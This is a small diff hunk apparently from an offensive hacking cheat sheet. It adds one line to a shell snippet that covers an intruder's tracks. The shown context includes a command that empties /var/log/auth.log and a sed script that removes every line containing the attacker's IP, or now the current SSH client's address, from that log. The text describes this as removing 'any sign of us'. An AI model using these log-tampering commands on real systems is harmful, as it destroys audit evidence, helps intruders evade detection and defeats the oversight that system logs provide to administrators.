@@ -1129,6 +1129,7 @@ cat /dev/null >/var/log/auth.log
 This will remove any sign of us from the log file:
 ```sh
 #DEL=thc.org
+#DEL=${SSH_CLIENT%% *}
 DEL=1.2.3.4
 LOG=/var/log/auth.log
 IFS="" a=$(sed "/${DEL}/d" <"${LOG}") && echo "$a">"${LOG}"
